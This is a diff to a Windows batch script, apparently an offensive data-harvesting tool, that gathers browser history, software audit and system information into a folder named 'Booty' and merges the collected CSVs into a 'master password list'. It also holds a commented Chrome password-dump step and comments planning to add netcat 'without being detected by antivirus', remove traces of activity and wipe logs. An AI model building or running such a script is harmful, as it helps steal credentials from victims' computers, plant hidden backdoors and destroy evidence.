@@ -17,16 +17,25 @@ GOTO WINAUDIT
 "Tools\Browsinghistoryview\browsinghistoryview\browsinghistoryview64.exe" /scomma "Booty\browserhistory.csv"
 GOTO WINAUDIT
 
-REM get system information
+REM get computer program information to see if vulnerable
 :WINAUDIT
 "Tools\winaudit\WinAudit.exe" /r=gsoPxuTUeERNtnzDaIbMpmidcSArCOHG /f="Booty\winaudit.html"
+GOTO SYSTEMINFO
+
+REM get system information
+:SYSTEMINFO
+systeminfo /FO CSV > "Booty\systeminfo.csv"
+
+REM Chrome passwords
+:CHROME
+REM python chromepasswords.py -csv
+
+REM Create master password list
+type Booty\*.csv >> Booty\master_password_list.csv
 
 
 
-REM type Booty\*.csv >> Booty\master_password_list.csv
-
-
-REM add nc
+REM add nc without being detected by antivirus
 REM remove all traces of activity
 REM wipe the logs
 
